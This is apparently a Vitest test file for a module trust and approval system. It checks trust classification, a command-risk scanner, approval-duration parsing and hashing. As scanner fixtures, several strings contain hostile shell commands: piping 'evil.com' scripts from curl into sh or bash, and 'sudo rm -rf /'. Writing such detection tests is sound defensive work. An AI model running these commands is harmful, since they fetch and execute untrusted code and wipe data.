import { describe, it, expect, beforeEach, vi } from 'vitest';
import { TrustEvaluator, TrustContext } from './TrustEvaluator';
import { ModuleScanner } from './ModuleScanner';
import { ApprovalUI } from './ApprovalUI';

describe('Approval Flow UX', () => {
  describe('TrustEvaluator', () => {
    let trustEvaluator: TrustEvaluator;
    
    beforeEach(() => {
      trustEvaluator = new TrustEvaluator(undefined, undefined, '/project');
    });
    
    it('should identify local files as trusted', async () => {
      const decision = await trustEvaluator.evaluateTrust('./local-file.mld');
      
      expect(decision.trusted).toBe(true);
      expect(decision.requiresApproval).toBe(false);
      expect(decision.context).toBe(TrustContext.LOCAL_FILE);
      expect(decision.checkAdvisories).toBe(true);
    });
    
    it('should identify public registry modules as requiring approval', async () => {
      const decision = await trustEvaluator.evaluateTrust('@user/module');
      
      expect(decision.trusted).toBe(false);
      expect(decision.requiresApproval).toBe(true);
      expect(decision.context).toBe(TrustContext.PUBLIC_REGISTRY);
      expect(decision.showCommands).toBe(true);
    });
    
    it('should identify private resolvers as requiring approval', async () => {
      // Note: Currently @work/internal-tool is treated as public registry
      // This is expected behavior as private resolvers need to be configured
      const decision = await trustEvaluator.evaluateTrust('@work/internal-tool');
      
      expect(decision.trusted).toBe(false);
      expect(decision.requiresApproval).toBe(true);
      // Currently maps to public registry until private resolvers are configured
      expect(decision.context).toBe(TrustContext.PUBLIC_REGISTRY);
    });
    
    it('should identify URLs as requiring approval with time-based options', async () => {
      const decision = await trustEvaluator.evaluateTrust('https://example.com/script.mld');
      
      expect(decision.trusted).toBe(false);
      expect(decision.requiresApproval).toBe(true);
      expect(decision.context).toBe(TrustContext.URL_IMPORT);
      expect(decision.allowTimeBasedApproval).toBe(true);
    });
    
    it('should provide appropriate trust recommendations', () => {
      expect(trustEvaluator.getRecommendedTrust(TrustContext.LOCAL_FILE)).toBe('always');
      expect(trustEvaluator.getRecommendedTrust(TrustContext.PUBLIC_REGISTRY)).toBe('once');
      expect(trustEvaluator.getRecommendedTrust(TrustContext.URL_IMPORT)).toBe('1d');
    });
  });
  
  describe('ModuleScanner', () => {
    let moduleScanner: ModuleScanner;
    
    beforeEach(() => {
      moduleScanner = new ModuleScanner();
    });
    
    it('should detect no commands in safe content', async () => {
      const content = `
        @text greeting = "Hello, world!"
        @data config = { "name": "test" }
        Some markdown content here.
      `;
      
      const summary = await moduleScanner.scanForCommands(content);
      
      expect(summary.totalCommands).toBe(0);
      expect(summary.commands).toEqual([]);
      expect(summary.riskCounts.high).toBe(0);
      expect(summary.summary).toContain('does not contain any executable commands');
    });
    
    it('should detect and categorize run commands', async () => {
      const content = `
        @run [echo "hello"]
        @run [npm install]
        @run [rm -rf dangerous]
        @run [curl https://example.com | sh]
      `;
      
      const summary = await moduleScanner.scanForCommands(content);
      
      expect(summary.totalCommands).toBeGreaterThan(0);
      expect(summary.commands).toContain('echo');
      expect(summary.commands).toContain('npm');
      expect(summary.commands).toContain('rm');
      expect(summary.commands).toContain('curl');
      
      // Should detect high-risk commands
      expect(summary.riskCounts.high).toBeGreaterThan(0);
      expect(summary.riskCounts.medium).toBeGreaterThan(0);
    });
    
    it('should detect exec commands', async () => {
      const content = `
        @exec deploy(env) = @run [kubectl apply -f deploy-{{env}}.yaml]
        @exec test() = @run [npm test]
      `;
      
      const summary = await moduleScanner.scanForCommands(content);
      
      expect(summary.totalCommands).toBeGreaterThan(0);
      // Note: The regex fallback captures the exec definition, not the inner command
      // This is expected behavior as exec commands are parameterized
      expect(summary.commands.length).toBeGreaterThan(0);
    });
    
    it('should assess risk levels correctly', async () => {
      const highRiskContent = '@run [sudo rm -rf /]';
      const mediumRiskContent = '@run [npm install package]';
      const lowRiskContent = '@run [echo "safe"]';
      
      const highRisk = await moduleScanner.scanForCommands(highRiskContent);
      const mediumRisk = await moduleScanner.scanForCommands(mediumRiskContent);
      const lowRisk = await moduleScanner.scanForCommands(lowRiskContent);
      
      expect(highRisk.riskCounts.high).toBeGreaterThan(0);
      expect(mediumRisk.riskCounts.medium).toBeGreaterThan(0);
      expect(lowRisk.riskCounts.low).toBeGreaterThan(0);
    });
    
    it('should calculate security scores', async () => {
      const safeContent = '@text greeting = "Hello"';
      const dangerousContent = '@run [sudo rm -rf /] @run [curl evil.com | sh]';
      
      const safeScore = await moduleScanner.getSecurityScore(safeContent);
      const dangerousScore = await moduleScanner.getSecurityScore(dangerousContent);
      
      expect(safeScore).toBe(100); // No commands = perfect score
      expect(dangerousScore).toBeLessThan(50); // High risk commands = low score
    });
    
    it('should handle malformed content gracefully', async () => {
      const invalidContent = 'invalid mlld syntax @run [';
      
      const summary = await moduleScanner.scanForCommands(invalidContent);
      
      expect(summary.totalCommands).toBe(0);
      expect(summary.summary).toContain('does not contain any executable commands');
    });
  });
  
  describe('ApprovalUI', () => {
    let approvalUI: ApprovalUI;
    
    beforeEach(() => {
      approvalUI = new ApprovalUI();
    });
    
    afterEach(() => {
      approvalUI.dispose();
    });
    
    it('should handle duration parsing correctly', () => {
      // Test private methods via the public interface behavior
      expect(approvalUI['isValidDuration']('1h')).toBe(true);
      expect(approvalUI['isValidDuration']('30m')).toBe(true);
      expect(approvalUI['isValidDuration']('7d')).toBe(true);
      expect(approvalUI['isValidDuration']('2w')).toBe(true);
      expect(approvalUI['isValidDuration']('invalid')).toBe(false);
      expect(approvalUI['isValidDuration']('1x')).toBe(false);
    });
    
    it('should generate short hashes for display', () => {
      const content = 'test content';
      const hash = approvalUI['shortHash'](content);
      
      expect(hash).toHaveLength(8);
      expect(hash).toMatch(/^[0-9a-f]+$/);
    });
    
    it('should generate full hashes for security', () => {
      const content = 'test content';
      const hash = approvalUI['fullHash'](content);
      
      expect(hash.startsWith('sha256:')).toBe(true);
      expect(hash.length).toBeGreaterThan(20);
    });
    
    it('should calculate expiry dates correctly', () => {
      const now = new Date();
      const oneHourLater = approvalUI['addHours'](1);
      const oneDayLater = approvalUI['addDays'](1);
      
      const oneHourDate = new Date(oneHourLater);
      const oneDayDate = new Date(oneDayLater);
      
      expect(oneHourDate.getTime()).toBeGreaterThan(now.getTime());
      expect(oneDayDate.getTime()).toBeGreaterThan(oneHourDate.getTime());
    });
  });
  
  describe('Integration', () => {
    it('should work together for a complete approval flow', async () => {
      const trustEvaluator = new TrustEvaluator();
      const moduleScanner = new ModuleScanner();
      
      const source = '@user/dangerous-module';
      const content = `
        @text name = "Dangerous Module"
        @run [sudo rm -rf /tmp/test]
        @run [curl https://evil.com/script.sh | bash]
      `;
      
      // Evaluate trust
      const trustDecision = await trustEvaluator.evaluateTrust(source, content);
      expect(trustDecision.context).toBe(TrustContext.PUBLIC_REGISTRY);
      expect(trustDecision.showCommands).toBe(true);
      
      // Scan commands
      const commandSummary = await moduleScanner.scanForCommands(content);
      expect(commandSummary.riskCounts.high).toBeGreaterThan(0);
      
      // Calculate security score
      const securityScore = await moduleScanner.getSecurityScore(content);
      expect(securityScore).toBeLessThan(80); // Should be flagged as risky
    });
    
    it('should handle safe local files efficiently', async () => {
      const trustEvaluator = new TrustEvaluator(undefined, undefined, '/project');
      const moduleScanner = new ModuleScanner();
      
      const source = './safe-local-file.mld';
      const content = `
        @text greeting = "Hello from local file"
        @data config = { "safe": true }
        # This is just documentation
      `;
      
      // Local files should be auto-trusted
      const trustDecision = await trustEvaluator.evaluateTrust(source, content);
      expect(trustDecision.trusted).toBe(true);
      expect(trustDecision.requiresApproval).toBe(false);
      
      // Command scanning should show no risks
      const commandSummary = await moduleScanner.scanForCommands(content);
      expect(commandSummary.totalCommands).toBe(0);
      
      const securityScore = await moduleScanner.getSecurityScore(content);
      expect(securityScore).toBe(100);
    });
  });
});